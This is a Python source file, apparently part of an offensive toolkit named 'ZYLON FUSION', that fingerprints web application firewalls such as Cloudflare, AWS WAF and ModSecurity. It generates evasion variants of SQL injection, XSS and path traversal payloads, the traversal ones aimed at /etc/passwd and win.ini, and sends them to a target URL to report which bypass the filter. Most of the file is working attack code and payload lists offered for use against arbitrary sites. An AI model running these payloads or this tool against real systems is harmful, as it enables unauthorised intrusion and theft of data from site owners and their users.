#!/usr/bin/env python3
"""
ZYLON FUSION v4.0 NUCLEAR - WAF Evasion & Bypass Engine
=======================================================
Fused from: WAFNinja (ML-based) + WhatWaf (detection + bypass)
Purpose: WAF fingerprinting, bypass generation, and evasion testing
Python 3.13 Compatible | Termux Non-Root
"""

import os
import re
import sys
import time
import random
import string
import urllib3
from urllib.parse import urlparse, quote

from core.shared_infra import shared_session, WAFEvasionMixin, regex_cache

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class WAFFingerprinter:
    """WAF Detection and Fingerprinting Engine"""
    
    WAF_SIGNATURES = {
        'Cloudflare': {
            'headers': ['cf-ray', 'cf-cache-status', 'server: cloudflare'],
            'cookies': ['__cfduid', 'cf_clearance', '__cf_bm'],
            'status': [403],
            'body': ['cloudflare', 'cf-browser-verification', 'Attention Required', 'cf-chl-bypass', 'ray id'],
            'bypass_hints': ['Use cf-clearance cookie', 'Try HTTP/2', 'Residential proxy rotation']
        },
        'AWS WAF': {
            'headers': ['x-amzn-requestid', 'x-amz-cf-id'],
            'cookies': [],
            'status': [403, 404],
            'body': ['AWS WAF', 'Request blocked', 'aws-waf'],
            'bypass_hints': ['Use X-Forwarded-For header', 'Try AWS API Gateway path traversal']
        },
        'Akamai': {
            'headers': ['x-akamai-transformed', 'x-cache: akamai'],
            'cookies': ['akamai'],
            'status': [403],
            'body': ['Access Denied', 'akamai', 'g2o-authorization'],
            'bypass_hints': ['HTTP parameter pollution', 'Content-Type switching']
        },
        'ModSecurity': {
            'headers': ['server: apache', 'server: nginx'],
            'cookies': [],
            'status': [403, 501],
            'body': ['ModSecurity', 'Not Acceptable', 'mod_security'],
            'bypass_hints': ['Case alternation', 'URL encoding', 'Double URL encoding']
        },
        'Imperva/Incapsula': {
            'headers': ['x-iinfo', 'x-cdn: incapsula'],
            'cookies': ['visid_incap', 'incap_ses', 'nlbi_'],
            'status': [403],
            'body': ['Incapsula', 'Incapsula incident', 'x-iinfo'],
            'bypass_hints': ['Origin header manipulation', 'Try HTTP/1.0']
        },
        'Sucuri': {
            'headers': ['x-sucuri-id', 'x-sucuri-cache'],
            'cookies': [],
            'status': [403],
            'body': ['Sucuri', 'sucuri.net', 'Access Denied - Sucuri'],
            'bypass_hints': ['XML content-type bypass', 'JSON body wrapping']
        },
        'F5 BIG-IP ASM': {
            'headers': ['x-wa-info', 'server: bigip'],
            'cookies': ['BIGipServer', 'F5', 'TSlwfewk', 'asi'],
            'status': [403],
            'body': ['F5', 'BIG-IP', 'Request Rejected'],
            'bypass_hints': ['Chunked encoding', 'HTTP pipeline']
        },
        'Fortinet FortiWeb': {
            'headers': ['server: fortinet'],
            'cookies': ['FORTIWAFSID'],
            'status': [403],
            'body': ['Fortinet', 'FortiWeb'],
            'bypass_hints': ['URL encoding variations', 'Path parameter injection']
        },
        'Barracuda': {
            'headers': ['server: barracuda'],
            'cookies': ['BARRACUDA'],
            'status': [403],
            'body': ['Barracuda', 'barracudanetworks'],
            'bypass_hints': ['HPP (HTTP Parameter Pollution)']
        },
        'Radware': {
            'headers': ['x-protected-by: radware'],
            'cookies': [],
            'status': [403],
            'body': ['Radware', 'AppWall'],
            'bypass_hints': ['JSON content-type switch']
        },
    }
    
    @classmethod
    def detect(cls, response):
        """Detect WAF from HTTP response"""
        detected = []
        
        for waf_name, sig in cls.WAF_SIGNATURES.items():
            score = 0
            
            # Check headers
            for h in sig.get('headers', []):
                if ':' in h:
                    h_name, h_val = h.split(':', 1)
                    for rh, rv in response.headers.items():
                        if rh.lower() == h_name.strip().lower() and h_val.strip().lower() in rv.lower():
                            score += 30
                else:
                    for rh in response.headers:
                        if h.lower() in rh.lower():
                            score += 20
            
            # Check cookies
            for c in sig.get('cookies', []):
                for cookie_name in response.headers.get('set-cookie', '').lower():
                    if c.lower() in cookie_name:
                        score += 25
            
            # Check body
            body_text = response.text.lower()
            for b in sig.get('body', []):
                if b.lower() in body_text:
                    score += 25
            
            # Check status code
            if response.status_code in sig.get('status', []):
                score += 10
            
            if score >= 30:
                detected.append({
                    'name': waf_name,
                    'confidence': min(score / 100, 1.0),
                    'bypass_hints': sig.get('bypass_hints', [])
                })
        
        return detected


class WAFEvasionEngine(WAFEvasionMixin):
    """WAF Bypass Generation Engine"""
    
    # SQLi bypass techniques
    SQLI_BYPASSES = [
        # Case alternation
        {'name': 'Case Alternation', 'payloads': [
            'SeLeCt', 'UnIoN', 'aNd', 'oR', 'FrOm', 'WhErE',
            'sElEcT', 'uNiOn', 'AnD', 'Or', 'fRoM', 'wHeRe',
        ]},
        # Comment injection
        {'name': 'Comment Injection', 'payloads': [
            'SEL/**/ECT', 'UNI/**/ON', 'AN/**/D', 'O/**/R',
            'SEL%00ECT', 'UNI%00ON', '/*!SELECT*/', '/*!UNION*/',
        ]},
        # URL encoding
        {'name': 'Double URL Encoding', 'payloads': [
            '%2527',  # ' -> %27 -> %2527
            '%2522',  # " -> %22 -> %2522
            '%253C',  # < -> %3C -> %253C
            '%2553%2545%254C%2545%2543%2554',  # SELECT
        ]},
        # Unicode bypass
        {'name': 'Unicode/I-Data', 'payloads': [
            '%u0027', '%u0022', '%u003C', '%u003E',
            'ＳＥＬＥＣＴ', 'ＵＮＩＯＮ',
        ]},
        # Whitespace alternatives
        {'name': 'Whitespace Alternatives', 'payloads': [
            'SELECT%09FROM', 'SELECT%0AFROM', 'SELECT%0DFROM',
            'SELECT%0BFROM', 'SELECT%0CFROM', 'SELECT%A0FROM',
            'SELECT/**/FROM', 'SELECT%00FROM',
        ]},
    ]
    
    # XSS bypass techniques
    XSS_BYPASSES = [
        {'name': 'Event Handler Variation', 'payloads': [
            '<img/src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<body/onload=alert(1)>',
            '<input/onfocus=alert(1) autofocus>',
            '<details open ontoggle=alert(1)>',
            '<marquee/onstart=alert(1)>',
            '<video/src=x onerror=alert(1)>',
            '<audio/src=x onerror=alert(1)>',
        ]},
        {'name': 'JavaScript Protocol', 'payloads': [
            'javascript:alert(1)',
            'java\tscript:alert(1)',
            'java\nscript:alert(1)',
            'jav&#x09;ascript:alert(1)',
            '&#x6a;avascript:alert(1)',
        ]},
        {'name': 'HTML Entity Encoding', 'payloads': [
            '<script>alert&#40;1&#41;</script>',
            '<script>alert&#x28;1&#x29;</script>',
            '<img src=x onerror="alert&#40;1&#41;">',
        ]},
        {'name': 'Template Literal', 'payloads': [
            '<script>alert`1`</script>',
            '<img src=x onerror=alert`1`>',
        ]},
        {'name': 'SVG/MathML', 'payloads': [
            '<svg><script>alert(1)</script></svg>',
            '<math><mtext><table><mglyph><style><!--</style>',
            '<svg><animate onbegin=alert(1) attributeName=x>',
        ]},
    ]
    
    # Path traversal bypasses
    PATH_BYPASSES = [
        '../../../etc/passwd',
        '..%2f..%2f..%2fetc/passwd',
        '..%252f..%252f..%252fetc/passwd',
        '..%c0%af..%c0%af..%c0%afetc/passwd',
        '....//....//....//etc/passwd',
        '..;/..;/..;/etc/passwd',
        '..%00/..%00/..%00/etc/passwd',
        '/etc/passwd%00',
        '/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        '..\\..\\..\\windows\\win.ini',
        '..%5c..%5c..%5cwindows/win.ini',
    ]
    
    @classmethod
    def generate_sqli_bypasses(cls, original_payload):
        """Generate WAF bypass variants for SQLi payload"""
        results = []
        
        # Original payload info
        results.append({'technique': 'original', 'payload': original_payload})
        
        # Apply each bypass technique
        for technique in cls.SQLI_BYPASSES:
            modified = original_payload
            
            # Case alternation
            if technique['name'] == 'Case Alternation':
                words = regex_cache.findall(r'\b\w+\b', original_payload)
                for word in words:
                    if word.lower() in ['select', 'union', 'from', 'where', 'and', 'or', 'insert', 'update', 'delete', 'drop', 'table']:
                        alt = random.choice(technique['payloads'])
                        if word.lower() == 'select':
                            modified = re.sub(r'\bselect\b', 'SeLeCt', modified, flags=re.IGNORECASE)
                        elif word.lower() == 'union':
                            modified = re.sub(r'\bunion\b', 'UnIoN', modified, flags=re.IGNORECASE)
                
                results.append({'technique': technique['name'], 'payload': modified})
            
            # Comment injection
            elif technique['name'] == 'Comment Injection':
                modified = re.sub(r'\b(select|union|from|where|and|or)\b', 
                                 lambda m: f'{m.group(0)[0]}/**/{m.group(0)[1:]}', 
                                 original_payload, flags=re.IGNORECASE)
                results.append({'technique': technique['name'], 'payload': modified})
            
            # Whitespace alternatives
            elif technique['name'] == 'Whitespace Alternatives':
                modified = re.sub(r'\s+', '%09', original_payload)
                results.append({'technique': technique['name'], 'payload': modified})
        
        # Double URL encoding
        encoded = quote(quote(original_payload, safe=''), safe='')
        results.append({'technique': 'Double URL Encoding', 'payload': encoded})
        
        # Chunked transfer
        results.append({'technique': 'Transfer-Encoding: chunked', 'payload': original_payload,
                        'header': {'Transfer-Encoding': 'chunked'}})
        
        # Content-Type switching
        results.append({'technique': 'Content-Type: application/json', 'payload': original_payload,
                        'header': {'Content-Type': 'application/json'}})
        
        return results
    
    @classmethod
    def generate_xss_bypasses(cls, original_payload=None):
        """Generate WAF bypass variants for XSS"""
        results = []
        for technique in cls.XSS_BYPASSES:
            for payload in technique['payloads']:
                results.append({'technique': technique['name'], 'payload': payload})
        return results
    
    @classmethod
    def generate_path_bypasses(cls):
        """Generate path traversal bypass payloads"""
        return [{'technique': 'Path Traversal Bypass', 'payload': p} for p in cls.PATH_BYPASSES]
    
    @classmethod
    def test_bypass(cls, url, bypass_payload, method='GET', headers=None, original_response=None):
        """Test a bypass payload against target"""
        try:
            h = headers or {}
            if isinstance(bypass_payload, dict) and 'header' in bypass_payload:
                h.update(bypass_payload['header'])
                payload = bypass_payload['payload']
            else:
                payload = bypass_payload
            
            resp = shared_session.request(
                method=method,
                url=url,
                params={'q': payload} if method == 'GET' else None,
                data={'q': payload} if method == 'POST' else None,
                headers=h,
                timeout=10,
                verify=False,
                allow_redirects=False
            )
            
            # Compare with original blocked response
            bypassed = False
            if original_response:
                if resp.status_code != original_response.status_code:
                    bypassed = True
                elif len(resp.text) > len(original_response.text) * 1.2:
                    bypassed = True
            elif resp.status_code == 200:
                bypassed = True
            
            return {
                'status': resp.status_code,
                'length': len(resp.text),
                'bypassed': bypassed
            }
        except Exception:
            return {'status': 0, 'length': 0, 'bypassed': False}


# ============================================================================
# CONSOLE INTERFACE
# ============================================================================

def run_waf_scan(console=None):
    """Interactive WAF scan for ZYLON menu"""
    if console is None:
        from rich.console import Console
        console = Console()
    
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt
    
    console.print(Panel(
        "[bold cyan]WAF EVASION ENGINE[/bold cyan]\n"
        "[yellow]Fused from: WAFNinja + WhatWaf | 10+ WAFs[/yellow]\n"
        "[green]Features: WAF fingerprinting, SQLi/XSS/Path bypass generation[/green]",
        border_style="bright_cyan"
    ))
    
    url = Prompt.ask("[cyan]Target URL[/cyan]")
    if not url.strip():
        console.print("[red][-] No URL![/red]")
        return
    
    # Step 1: Detect WAF
    console.print("\n[cyan][*] Step 1: WAF Detection...[/cyan]")
    
    # Send normal request
    try:
        normal_resp = shared_session.get(url.strip(), timeout=10, verify=False)
    except Exception as e:
        console.print(f"[red][-] Connection error: {e}[/red]")
        return
    
    # Send malicious request
    try:
        test_resp = shared_session.get(url.strip(), params={'q': "' OR 1=1-- <script>alert(1)</script>"},
                                timeout=10, verify=False)
    except Exception:
        test_resp = normal_resp
    
    wafs = WAFFingerprinter.detect(test_resp)
    
    if wafs:
        console.print(f"\n[bold green][+] WAF DETECTED![/bold green]")
        for waf in wafs:
            console.print(f"  [yellow]{waf['name']}[/yellow] (confidence: {waf['confidence']:.0%})")
            for hint in waf.get('bypass_hints', []):
                console.print(f"    [dim]Hint: {hint}[/dim]")
    else:
        console.print("[yellow][-] No WAF detected (or WAF is silent)[/yellow]")
    
    # Step 2: Bypass generation
    console.print("\n[cyan][*] Step 2: Bypass Payload Generation...[/cyan]")
    
    console.print("\n[yellow]Generate bypasses for:[/yellow]")
    console.print("  [1] SQL Injection")
    console.print("  [2] XSS")
    console.print("  [3] Path Traversal")
    console.print("  [4] All")
    
    choice = Prompt.ask("[cyan]Select[/cyan]", default="4")
    
    all_bypasses = []
    
    if choice in ('1', '4'):
        sqli_payload = Prompt.ask("[cyan]SQLi payload[/cyan]", default="' OR 1=1--")
        sqli_bypasses = WAFEvasionEngine.generate_sqli_bypasses(sqli_payload)
        all_bypasses.extend([('SQLi', b) for b in sqli_bypasses])
    
    if choice in ('2', '4'):
        xss_bypasses = WAFEvasionEngine.generate_xss_bypasses()
        all_bypasses.extend([('XSS', b) for b in xss_bypasses])
    
    if choice in ('3', '4'):
        path_bypasses = WAFEvasionEngine.generate_path_bypasses()
        all_bypasses.extend([('Path', b) for b in path_bypasses])
    
    # Display bypasses
    console.print(f"\n[bold green][+] Generated {len(all_bypasses)} bypass payloads![/bold green]")
    
    for attack_type, bypass in all_bypasses[:30]:
        console.print(f"  [{attack_type}] [{bypass['technique']}] {bypass['payload'][:80]}")
    
    # Step 3: Test bypasses
    test_choice = Prompt.ask("[cyan]Test bypasses against target?[/cyan]", choices=["y", "n"], default="n")
    
    if test_choice == 'y':
        console.print("\n[cyan][*] Testing bypasses...[/cyan]")
        successful = []
        
        for attack_type, bypass in all_bypasses:
            result = WAFEvasionEngine.test_bypass(url.strip(), bypass, original_response=test_resp)
            if result['bypassed']:
                successful.append((attack_type, bypass, result))
        
        if successful:
            console.print(f"\n[bold red][!] {len(successful)} BYPASS(ES) SUCCESSFUL![/bold red]")
            for at, bp, res in successful:
                console.print(f"  [{at}] [{bp['technique']}] Status: {res['status']} | {bp['payload'][:60]}")
        else:
            console.print("[yellow][-] No successful bypasses.[/yellow]")


if __name__ == "__main__":
    run_waf_scan()
